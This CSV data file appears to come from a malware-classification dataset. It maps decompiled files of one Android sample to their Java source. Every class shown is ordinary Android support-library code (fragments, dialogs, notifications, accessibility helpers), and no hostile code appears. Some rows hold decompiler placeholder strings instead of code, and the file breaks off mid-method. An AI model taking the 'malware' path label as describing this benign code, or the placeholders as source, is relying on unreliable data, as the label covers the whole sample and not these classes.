"filepath","code"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@19e7a160"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.accessibilityservice\AccessibilityServiceInfoCompatIcs.code","class AccessibilityServiceInfoCompatIcs {   AccessibilityServiceInfoCompatIcs(){   }   public static boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return info.getCanRetrieveWindowContent();   }   public static String getDescription(  AccessibilityServiceInfo info){     return info.getDescription();   }   public static String getId(  AccessibilityServiceInfo info){     return info.getId();   }   public static ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return info.getResolveInfo();   }   public static String getSettingsActivityName(  AccessibilityServiceInfo info){     return info.getSettingsActivityName();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.accessibilityservice\AccessibilityServiceInfoIcsImpl.code","static class AccessibilityServiceInfoIcsImpl extends AccessibilityServiceInfoStubImpl {   AccessibilityServiceInfoIcsImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getCanRetrieveWindowContent(info);   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getDescription(info);   }   @Override public String getId(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getId(info);   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getResolveInfo(info);   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return AccessibilityServiceInfoCompatIcs.getSettingsActivityName(info);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.accessibilityservice\AccessibilityServiceInfoStubImpl.code","static class AccessibilityServiceInfoStubImpl implements AccessibilityServiceInfoVersionImpl {   AccessibilityServiceInfoStubImpl(){   }   @Override public boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo info){     return false;   }   @Override public String getDescription(  AccessibilityServiceInfo info){     return null;   }   @Override public String getId(  AccessibilityServiceInfo info){     return null;   }   @Override public ResolveInfo getResolveInfo(  AccessibilityServiceInfo info){     return null;   }   @Override public String getSettingsActivityName(  AccessibilityServiceInfo info){     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.accessibilityservice\AccessibilityServiceInfoVersionImpl.code","interface AccessibilityServiceInfoVersionImpl {   boolean getCanRetrieveWindowContent(  AccessibilityServiceInfo accessibilityServiceInfo);   String getDescription(  AccessibilityServiceInfo accessibilityServiceInfo);   String getId(  AccessibilityServiceInfo accessibilityServiceInfo);   ResolveInfo getResolveInfo(  AccessibilityServiceInfo accessibilityServiceInfo);   String getSettingsActivityName(  AccessibilityServiceInfo accessibilityServiceInfo); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ActivityCompat.code","public class ActivityCompat extends ContextCompat {   public static boolean invalidateOptionsMenu(  Activity activity){     if (Build.VERSION.SDK_INT < 11) {       return false;     }     ActivityCompatHoneycomb.invalidateOptionsMenu(activity);     return true;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ActivityCompatHoneycomb.code","class ActivityCompatHoneycomb {   ActivityCompatHoneycomb(){   }   public static void invalidateOptionsMenu(  Activity activity){     activity.invalidateOptionsMenu();   }   static void dump(  Activity activity,  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     activity.dump(prefix,fd,writer,args);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\BackStackEntry.code","public interface BackStackEntry {   CharSequence getBreadCrumbShortTitle();   int getBreadCrumbShortTitleRes();   CharSequence getBreadCrumbTitle();   int getBreadCrumbTitleRes();   int getId();   String getName(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\BackStackRecord.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1dc2de84"
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\BackStackState.code","public final class BackStackState implements Parcelable {   public static final Parcelable.Creator<BackStackState> CREATOR=new Parcelable.Creator<BackStackState>(){     @Override public BackStackState createFromParcel(    Parcel in){       return new BackStackState(in);     }     @Override public BackStackState[] newArray(    int size){       return new BackStackState[size];     }   } ;   final int mBreadCrumbShortTitleRes;   final CharSequence mBreadCrumbShortTitleText;   final int mBreadCrumbTitleRes;   final CharSequence mBreadCrumbTitleText;   final int mIndex;   final String mName;   final int[] mOps;   final int mTransition;   final int mTransitionStyle;   public BackStackState(  FragmentManagerImpl fm,  BackStackRecord bse){     int pos;     int numRemoved=0;     for (BackStackRecord.Op op=bse.mHead; op != null; op=op.next) {       if (op.removed != null) {         numRemoved+=op.removed.size();       }     }     this.mOps=new int[(bse.mNumOp * 7) + numRemoved];     if (!bse.mAddToBackStack) {       throw new IllegalStateException(""Not on back stack"");     }     BackStackRecord.Op op2=bse.mHead;     int pos2=0;     while (op2 != null) {       int pos3=pos2 + 1;       this.mOps[pos2]=op2.cmd;       int pos4=pos3 + 1;       this.mOps[pos3]=op2.fragment != null ? op2.fragment.mIndex : -1;       int pos5=pos4 + 1;       this.mOps[pos4]=op2.enterAnim;       int pos6=pos5 + 1;       this.mOps[pos5]=op2.exitAnim;       int pos7=pos6 + 1;       this.mOps[pos6]=op2.popEnterAnim;       int pos8=pos7 + 1;       this.mOps[pos7]=op2.popExitAnim;       if (op2.removed != null) {         int N=op2.removed.size();         this.mOps[pos8]=N;         int i=0;         int pos9=pos8 + 1;         while (i < N) {           this.mOps[pos9]=op2.removed.get(i).mIndex;           i++;           pos9++;         }         pos=pos9;       }  else {         pos=pos8 + 1;         this.mOps[pos8]=0;       }       op2=op2.next;       pos2=pos;     }     this.mTransition=bse.mTransition;     this.mTransitionStyle=bse.mTransitionStyle;     this.mName=bse.mName;     this.mIndex=bse.mIndex;     this.mBreadCrumbTitleRes=bse.mBreadCrumbTitleRes;     this.mBreadCrumbTitleText=bse.mBreadCrumbTitleText;     this.mBreadCrumbShortTitleRes=bse.mBreadCrumbShortTitleRes;     this.mBreadCrumbShortTitleText=bse.mBreadCrumbShortTitleText;   }   public BackStackState(  Parcel in){     this.mOps=in.createIntArray();     this.mTransition=in.readInt();     this.mTransitionStyle=in.readInt();     this.mName=in.readString();     this.mIndex=in.readInt();     this.mBreadCrumbTitleRes=in.readInt();     this.mBreadCrumbTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);     this.mBreadCrumbShortTitleRes=in.readInt();     this.mBreadCrumbShortTitleText=(CharSequence)TextUtils.CHAR_SEQUENCE_CREATOR.createFromParcel(in);   }   public BackStackRecord instantiate(  FragmentManagerImpl fm){     BackStackRecord bse=new BackStackRecord(fm);     int pos=0;     while (pos < this.mOps.length) {       BackStackRecord.Op op=new BackStackRecord.Op();       int pos2=pos + 1;       op.cmd=this.mOps[pos];       if (FragmentManagerImpl.DEBUG) {         Log.v(""FragmentManager"",""BSE "" + bse + "" set base fragment #""+ this.mOps[pos2]);       }       int pos3=pos2 + 1;       int findex=this.mOps[pos2];       if (findex >= 0) {         Fragment f=fm.mActive.get(findex);         op.fragment=f;       }  else {         op.fragment=null;       }       int pos4=pos3 + 1;       op.enterAnim=this.mOps[pos3];       int pos5=pos4 + 1;       op.exitAnim=this.mOps[pos4];       int pos6=pos5 + 1;       op.popEnterAnim=this.mOps[pos5];       int pos7=pos6 + 1;       op.popExitAnim=this.mOps[pos6];       int pos8=pos7 + 1;       int N=this.mOps[pos7];       if (N > 0) {         op.removed=new ArrayList<>(N);         int i=0;         while (i < N) {           if (FragmentManagerImpl.DEBUG) {             Log.v(""FragmentManager"",""BSE "" + bse + "" set remove fragment #""+ this.mOps[pos8]);           }           Fragment r=fm.mActive.get(this.mOps[pos8]);           op.removed.add(r);           i++;           pos8++;         }       }       pos=pos8;       bse.addOp(op);     }     bse.mTransition=this.mTransition;     bse.mTransitionStyle=this.mTransitionStyle;     bse.mName=this.mName;     bse.mIndex=this.mIndex;     bse.mAddToBackStack=true;     bse.mBreadCrumbTitleRes=this.mBreadCrumbTitleRes;     bse.mBreadCrumbTitleText=this.mBreadCrumbTitleText;     bse.mBreadCrumbShortTitleRes=this.mBreadCrumbShortTitleRes;     bse.mBreadCrumbShortTitleText=this.mBreadCrumbShortTitleText;     bse.bumpBackStackNesting(1);     return bse;   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeIntArray(this.mOps);     dest.writeInt(this.mTransition);     dest.writeInt(this.mTransitionStyle);     dest.writeString(this.mName);     dest.writeInt(this.mIndex);     dest.writeInt(this.mBreadCrumbTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbTitleText,dest,0);     dest.writeInt(this.mBreadCrumbShortTitleRes);     TextUtils.writeToParcel(this.mBreadCrumbShortTitleText,dest,0);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\Builder.code","public static class Builder {   CharSequence mContentInfo;   PendingIntent mContentIntent;   CharSequence mContentText;   CharSequence mContentTitle;   Context mContext;   PendingIntent mFullScreenIntent;   Bitmap mLargeIcon;   Notification mNotification=new Notification();   int mNumber;   RemoteViews mTickerView;   public Builder(  Context context){     this.mContext=context;     this.mNotification.when=System.currentTimeMillis();     this.mNotification.audioStreamType=-1;   }   public Builder setWhen(  long when){     this.mNotification.when=when;     return this;   }   public Builder setSmallIcon(  int icon){     this.mNotification.icon=icon;     return this;   }   public Builder setSmallIcon(  int icon,  int level){     this.mNotification.icon=icon;     this.mNotification.iconLevel=level;     return this;   }   public Builder setContentTitle(  CharSequence title){     this.mContentTitle=title;     return this;   }   public Builder setContentText(  CharSequence text){     this.mContentText=text;     return this;   }   public Builder setNumber(  int number){     this.mNumber=number;     return this;   }   public Builder setContentInfo(  CharSequence info){     this.mContentInfo=info;     return this;   }   public Builder setContent(  RemoteViews views){     this.mNotification.contentView=views;     return this;   }   public Builder setContentIntent(  PendingIntent intent){     this.mContentIntent=intent;     return this;   }   public Builder setDeleteIntent(  PendingIntent intent){     this.mNotification.deleteIntent=intent;     return this;   }   public Builder setFullScreenIntent(  PendingIntent intent,  boolean highPriority){     this.mFullScreenIntent=intent;     setFlag(128,highPriority);     return this;   }   public Builder setTicker(  CharSequence tickerText){     this.mNotification.tickerText=tickerText;     return this;   }   public Builder setTicker(  CharSequence tickerText,  RemoteViews views){     this.mNotification.tickerText=tickerText;     this.mTickerView=views;     return this;   }   public Builder setLargeIcon(  Bitmap icon){     this.mLargeIcon=icon;     return this;   }   public Builder setSound(  Uri sound){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=-1;     return this;   }   public Builder setSound(  Uri sound,  int streamType){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=streamType;     return this;   }   public Builder setVibrate(  long[] pattern){     this.mNotification.vibrate=pattern;     return this;   }   public Builder setLights(  int argb,  int onMs,  int offMs){     this.mNotification.ledARGB=argb;     this.mNotification.ledOnMS=onMs;     this.mNotification.ledOffMS=offMs;     boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;     this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));     return this;   }   public Builder setOngoing(  boolean ongoing){     setFlag(2,ongoing);     return this;   }   public Builder setOnlyAlertOnce(  boolean onlyAlertOnce){     setFlag(8,onlyAlertOnce);     return this;   }   public Builder setAutoCancel(  boolean autoCancel){     setFlag(16,autoCancel);     return this;   }   public Builder setDefaults(  int defaults){     this.mNotification.defaults=defaults;     if ((defaults & 4) != 0) {       this.mNotification.flags|=1;     }     return this;   }   private void setFlag(  int mask,  boolean value){     if (value) {       this.mNotification.flags|=mask;     }  else {       this.mNotification.flags&=mask ^ (-1);     }   }   public Notification getNotification(){     return NotificationCompat.IMPL.getNotification(this);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\DialogFragment.code","public class DialogFragment extends Fragment implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   private static final String SAVED_BACK_STACK_ID=""android:backStackId"";   private static final String SAVED_CANCELABLE=""android:cancelable"";   private static final String SAVED_DIALOG_STATE_TAG=""android:savedDialogState"";   private static final String SAVED_SHOWS_DIALOG=""android:showsDialog"";   private static final String SAVED_STYLE=""android:style"";   private static final String SAVED_THEME=""android:theme"";   public static final int STYLE_NORMAL=0;   public static final int STYLE_NO_FRAME=2;   public static final int STYLE_NO_INPUT=3;   public static final int STYLE_NO_TITLE=1;   Dialog mDialog;   boolean mDismissed;   boolean mShownByMe;   boolean mViewDestroyed;   int mStyle=0;   int mTheme=0;   boolean mCancelable=true;   boolean mShowsDialog=true;   int mBackStackId=-1;   public void setStyle(  int style,  int theme){     this.mStyle=style;     if (this.mStyle == 2 || this.mStyle == 3) {       this.mTheme=R.style.Theme.Panel;     }     if (theme != 0) {       this.mTheme=theme;     }   }   public void show(  FragmentManager manager,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     FragmentTransaction ft=manager.beginTransaction();     ft.add(this,tag);     ft.commit();   }   public int show(  FragmentTransaction transaction,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     transaction.add(this,tag);     this.mViewDestroyed=false;     this.mBackStackId=transaction.commit();     return this.mBackStackId;   }   public void dismiss(){     dismissInternal(false);   }   public void dismissAllowingStateLoss(){     dismissInternal(true);   }   void dismissInternal(  boolean allowStateLoss){     if (!this.mDismissed) {       this.mDismissed=true;       this.mShownByMe=false;       if (this.mDialog != null) {         this.mDialog.dismiss();         this.mDialog=null;       }       this.mViewDestroyed=true;       if (this.mBackStackId >= 0) {         getFragmentManager().popBackStack(this.mBackStackId,1);         this.mBackStackId=-1;         return;       }       FragmentTransaction ft=getFragmentManager().beginTransaction();       ft.remove(this);       if (allowStateLoss) {         ft.commitAllowingStateLoss();       }  else {         ft.commit();       }     }   }   public Dialog getDialog(){     return this.mDialog;   }   public int getTheme(){     return this.mTheme;   }   public void setCancelable(  boolean cancelable){     this.mCancelable=cancelable;     if (this.mDialog != null) {       this.mDialog.setCancelable(cancelable);     }   }   public boolean isCancelable(){     return this.mCancelable;   }   public void setShowsDialog(  boolean showsDialog){     this.mShowsDialog=showsDialog;   }   public boolean getShowsDialog(){     return this.mShowsDialog;   }   @Override public void onAttach(  Activity activity){     super.onAttach(activity);     if (!this.mShownByMe) {       this.mDismissed=false;     }   }   @Override public void onDetach(){     super.onDetach();     if (!this.mShownByMe && !this.mDismissed) {       this.mDismissed=true;     }   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     this.mShowsDialog=this.mContainerId == 0;     if (savedInstanceState != null) {       this.mStyle=savedInstanceState.getInt(SAVED_STYLE,0);       this.mTheme=savedInstanceState.getInt(SAVED_THEME,0);       this.mCancelable=savedInstanceState.getBoolean(SAVED_CANCELABLE,true);       this.mShowsDialog=savedInstanceState.getBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog);       this.mBackStackId=savedInstanceState.getInt(SAVED_BACK_STACK_ID,-1);     }   }   @Override public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     if (!this.mShowsDialog) {       return super.getLayoutInflater(savedInstanceState);     }     this.mDialog=onCreateDialog(savedInstanceState); switch (this.mStyle) { case 3:       this.mDialog.getWindow().addFlags(24); case 1: case 2:     this.mDialog.requestWindowFeature(1);   break; } if (this.mDialog != null) { return (LayoutInflater)this.mDialog.getContext().getSystemService(""layout_inflater""); } return (LayoutInflater)this.mActivity.getSystemService(""layout_inflater""); } public Dialog onCreateDialog(Bundle savedInstanceState){ return new Dialog(getActivity(),getTheme()); } @Override public void onCancel(DialogInterface dialog){ } @Override public void onDismiss(DialogInterface dialog){ if (!this.mViewDestroyed) { dismissInternal(true); } } @Override public void onActivityCreated(Bundle savedInstanceState){ Bundle dialogState; super.onActivityCreated(savedInstanceState); if (this.mShowsDialog) { View view=getView(); if (view != null) {   if (view.getParent() != null) {     throw new IllegalStateException(""DialogFragment can not be attached to a container view"");   }   this.mDialog.setContentView(view); } this.mDialog.setOwnerActivity(getActivity()); this.mDialog.setCancelable(this.mCancelable); this.mDialog.setOnCancelListener(this); this.mDialog.setOnDismissListener(this); if (savedInstanceState != null && (dialogState=savedInstanceState.getBundle(SAVED_DIALOG_STATE_TAG)) != null) {   this.mDialog.onRestoreInstanceState(dialogState); } } } @Override public void onStart(){ super.onStart(); if (this.mDialog != null) { this.mViewDestroyed=false; this.mDialog.show(); } } @Override public void onSaveInstanceState(Bundle outState){ Bundle dialogState; super.onSaveInstanceState(outState); if (this.mDialog != null && (dialogState=this.mDialog.onSaveInstanceState()) != null) { outState.putBundle(SAVED_DIALOG_STATE_TAG,dialogState); } if (this.mStyle != 0) { outState.putInt(SAVED_STYLE,this.mStyle); } if (this.mTheme != 0) { outState.putInt(SAVED_THEME,this.mTheme); } if (!this.mCancelable) { outState.putBoolean(SAVED_CANCELABLE,this.mCancelable); } if (!this.mShowsDialog) { outState.putBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog); } if (this.mBackStackId != -1) { outState.putInt(SAVED_BACK_STACK_ID,this.mBackStackId); } } @Override public void onStop(){ super.onStop(); if (this.mDialog != null) { this.mDialog.hide(); } } @Override public void onDestroyView(){ super.onDestroyView(); if (this.mDialog != null) { this.mViewDestroyed=true; this.mDialog.dismiss(); this.mDialog=null; } } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\Fragment.code","public class Fragment implements ComponentCallbacks, View.OnCreateContextMenuListener {   static final int ACTIVITY_CREATED=2;   static final int CREATED=1;   static final int INITIALIZING=0;   static final int RESUMED=5;   static final int STARTED=4;   static final int STOPPED=3;   private static final HashMap<String,Class<?>> sClassMap=new HashMap<>();   FragmentActivity mActivity;   boolean mAdded;   View mAnimatingAway;   Bundle mArguments;   int mBackStackNesting;   boolean mCalled;   boolean mCheckedForLoaderManager;   ViewGroup mContainer;   int mContainerId;   boolean mDeferStart;   boolean mDetached;   int mFragmentId;   FragmentManagerImpl mFragmentManager;   boolean mFromLayout;   boolean mHasMenu;   boolean mHidden;   boolean mInLayout;   View mInnerView;   LoaderManagerImpl mLoaderManager;   boolean mLoadersStarted;   int mNextAnim;   boolean mRemoving;   boolean mRestored;   boolean mResumed;   boolean mRetainInstance;   boolean mRetaining;   Bundle mSavedFragmentState;   SparseArray<Parcelable> mSavedViewState;   int mStateAfterAnimating;   String mTag;   Fragment mTarget;   int mTargetRequestCode;   View mView;   String mWho;   int mState=0;   int mIndex=-1;   int mTargetIndex=-1;   boolean mMenuVisible=true;   boolean mUserVisibleHint=true; public static class SavedState implements Parcelable {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in,null);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     final Bundle mState;     public SavedState(    Bundle state){       this.mState=state;     }     SavedState(    Parcel in,    ClassLoader loader){       this.mState=in.readBundle();       if (loader != null && this.mState != null) {         this.mState.setClassLoader(loader);       }     }     @Override public int describeContents(){       return 0;     }     @Override public void writeToParcel(    Parcel dest,    int flags){       dest.writeBundle(this.mState);     }   } public static class InstantiationException extends RuntimeException {     public InstantiationException(    String msg,    Exception cause){       super(msg,cause);     }   }   public static Fragment instantiate(  Context context,  String fname){     return instantiate(context,fname,null);   }   public static Fragment instantiate(  Context context,  String fname,  Bundle args){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       Fragment f=(Fragment)clazz.newInstance();       if (args != null) {         args.setClassLoader(f.getClass().getClassLoader());         f.mArguments=args;       }       return f;     }  catch (    ClassNotFoundException e) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e);     } catch (    IllegalAccessException e2) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e2);     } catch (    java.lang.InstantiationException e3) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e3);     }   }   public final void restoreViewState(){     if (this.mSavedViewState != null) {       this.mInnerView.restoreHierarchyState(this.mSavedViewState);       this.mSavedViewState=null;     }   }   public final void setIndex(  int index){     this.mIndex=index;     this.mWho=""android:fragment:"" + this.mIndex;   }   public final boolean isInBackStack(){     return this.mBackStackNesting > 0;   }   public final boolean equals(  Object o){     return super.equals(o);   }   public final int hashCode(){     return super.hashCode();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     DebugUtils.buildShortClassTag(this,sb);     if (this.mIndex >= 0) {       sb.append("" #"");       sb.append(this.mIndex);     }     if (this.mFragmentId != 0) {       sb.append("" id=0x"");       sb.append(Integer.toHexString(this.mFragmentId));     }     if (this.mTag != null) {       sb.append("" "");       sb.append(this.mTag);     }     sb.append('}');     return sb.toString();   }   public final int getId(){     return this.mFragmentId;   }   public final String getTag(){     return this.mTag;   }   public void setArguments(  Bundle args){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mArguments=args;   }   public final Bundle getArguments(){     return this.mArguments;   }   public void setInitialSavedState(  SavedState state){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mSavedFragmentState=(state == null || state.mState == null) ? null : state.mState;   }   public void setTargetFragment(  Fragment fragment,  int requestCode){     this.mTarget=fragment;     this.mTargetRequestCode=requestCode;   }   public final Fragment getTargetFragment(){     return this.mTarget;   }   public final int getTargetRequestCode(){     return this.mTargetRequestCode;   }   public final FragmentActivity getActivity(){     return this.mActivity;   }   public final Resources getResources(){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     return this.mActivity.getResources();   }   public final CharSequence getText(  int resId){     return getResources().getText(resId);   }   public final String getString(  int resId){     return getResources().getString(resId);   }   public final String getString(  int resId,  Object... formatArgs){     return getResources().getString(resId,formatArgs);   }   public final FragmentManager getFragmentManager(){     return this.mFragmentManager;   }   public final boolean isAdded(){     return this.mActivity != null && this.mAdded;   }   public final boolean isDetached(){     return this.mDetached;   }   public final boolean isRemoving(){     return this.mRemoving;   }   public final boolean isInLayout(){     return this.mInLayout;   }   public final boolean isResumed(){     return this.mResumed;   }   public final boolean isVisible(){     return (!isAdded() || isHidden() || this.mView == null || this.mView.getWindowToken() == null || this.mView.getVisibility() != 0) ? false : true;   }   public final boolean isHidden(){     return this.mHidden;   }   public void onHiddenChanged(  boolean hidden){   }   public void setRetainInstance(  boolean retain){     this.mRetainInstance=retain;   }   public final boolean getRetainInstance(){     return this.mRetainInstance;   }   public void setHasOptionsMenu(  boolean hasMenu){     if (this.mHasMenu != hasMenu) {       this.mHasMenu=hasMenu;       if (isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setMenuVisibility(  boolean menuVisible){     if (this.mMenuVisible != menuVisible) {       this.mMenuVisible=menuVisible;       if (this.mHasMenu && isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setUserVisibleHint(  boolean isVisibleToUser){     if (!this.mUserVisibleHint && isVisibleToUser && this.mState < 4) {       this.mFragmentManager.performPendingDeferredStart(this);     }     this.mUserVisibleHint=isVisibleToUser;     this.mDeferStart=!isVisibleToUser;   }   public boolean getUserVisibleHint(){     return this.mUserVisibleHint;   }   public LoaderManager getLoaderManager(){     if (this.mLoaderManager != null) {       return this.mLoaderManager;     }     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mCheckedForLoaderManager=true;     this.mLoaderManager=this.mActivity.getLoaderManager(this.mIndex,this.mLoadersStarted,true);     return this.mLoaderManager;   }   public void startActivity(  Intent intent){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,-1);   }   public void startActivityForResult(  Intent intent,  int requestCode){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,requestCode);   }   public void onActivityResult(  int requestCode,  int resultCode,  Intent data){   }   public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     return this.mActivity.getLayoutInflater();   }   public void onInflate(  Activity activity,  AttributeSet attrs,  Bundle savedInstanceState){     this.mCalled=true;   }   public void onAttach(  Activity activity){     this.mCalled=true;   }   public Animation onCreateAnimation(  int transit,  boolean enter,  int nextAnim){     return null;   }   public void onCreate(  Bundle savedInstanceState){     this.mCalled=true;   }   public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     return null;   }   public void onViewCreated(  View view,  Bundle savedInstanceState){   }   public View getView(){     return this.mView;   }   public void onActivityCreated(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onStart(){     this.mCalled=true;     if (!this.mLoadersStarted) {       this.mLoadersStarted=true;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mIndex,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         this.mLoaderManager.doStart();       }     }   }   public void onResume(){     this.mCalled=true;   }   public void onSaveInstanceState(  Bundle outState){   }   @Override public void onConfigurationChanged(  Configuration newConfig){     this.mCalled=true;   }   public void onPause(){     this.mCalled=true;   }   public void onStop(){     this.mCalled=true;   }   @Override public void onLowMemory(){     this.mCalled=true;   }   public void onDestroyView(){     this.mCalled=true;   }   public void onDestroy(){     this.mCalled=true;     if (!this.mCheckedForLoaderManager) {       this.mCheckedForLoaderManager=true;       this.mLoaderManager=this.mActivity.getLoaderManager(this.mIndex,this.mLoadersStarted,false);     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doDestroy();     }   }   public void initState(){     this.mIndex=-1;     this.mWho=null;     this.mAdded=false;     this.mRemoving=false;     this.mResumed=false;     this.mFromLayout=false;     this.mInLayout=false;     this.mRestored=false;     this.mBackStackNesting=0;     this.mFragmentManager=null;     this.mActivity=null;     this.mFragmentId=0;     this.mContainerId=0;     this.mTag=null;     this.mHidden=false;     this.mDetached=false;     this.mRetaining=false;     this.mLoaderManager=null;     this.mLoadersStarted=false;     this.mCheckedForLoaderManager=false;   }   public void onDetach(){     this.mCalled=true;   }   public void onCreateOptionsMenu(  Menu menu,  MenuInflater inflater){   }   public void onPrepareOptionsMenu(  Menu menu){   }   public void onDestroyOptionsMenu(){   }   public boolean onOptionsItemSelected(  MenuItem item){     return false;   }   public void onOptionsMenuClosed(  Menu menu){   }   @Override public void onCreateContextMenu(  ContextMenu menu,  View v,  ContextMenu.ContextMenuInfo menuInfo){     getActivity().onCreateContextMenu(menu,v,menuInfo);   }   public void registerForContextMenu(  View view){     view.setOnCreateContextMenuListener(this);   }   public void unregisterForContextMenu(  View view){     view.setOnCreateContextMenuListener(null);   }   public boolean onContextItemSelected(  MenuItem item){     return false;   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mFragmentId=#"");     writer.print(Integer.toHexString(this.mFragmentId));     writer.print("" mContainerId=#"");     writer.print(Integer.toHexString(this.mContainerId));     writer.print("" mTag="");     writer.println(this.mTag);     writer.print(prefix);     writer.print(""mState="");     writer.print(this.mState);     writer.print("" mIndex="");     writer.print(this.mIndex);     writer.print("" mWho="");     writer.print(this.mWho);     writer.print("" mBackStackNesting="");     writer.println(this.mBackStackNesting);     writer.print(prefix);     writer.print(""mAdded="");     writer.print(this.mAdded);     writer.print("" mRemoving="");     writer.print(this.mRemoving);     writer.print("" mResumed="");     writer.print(this.mResumed);     writer.print("" mFromLayout="");     writer.print(this.mFromLayout);     writer.print("" mInLayout="");     writer.println(this.mInLayout);     writer.print(prefix);     writer.print(""mHidden="");     writer.print(this.mHidden);     writer.print("" mDetached="");     writer.print(this.mDetached);     writer.print("" mMenuVisible="");     writer.print(this.mMenuVisible);     writer.print("" mHasMenu="");     writer.println(this.mHasMenu);     writer.print(prefix);     writer.print(""mRetainInstance="");     writer.print(this.mRetainInstance);     writer.print("" mRetaining="");     writer.print(this.mRetaining);     writer.print("" mUserVisibleHint="");     writer.println(this.mUserVisibleHint);     if (this.mFragmentManager != null) {       writer.print(prefix);       writer.print(""mFragmentManager="");       writer.println(this.mFragmentManager);     }     if (this.mActivity != null) {       writer.print(prefix);       writer.print(""mActivity="");       writer.println(this.mActivity);     }     if (this.mArguments != null) {       writer.print(prefix);       writer.print(""mArguments="");       writer.println(this.mArguments);     }     if (this.mSavedFragmentState != null) {       writer.print(prefix);       writer.print(""mSavedFragmentState="");       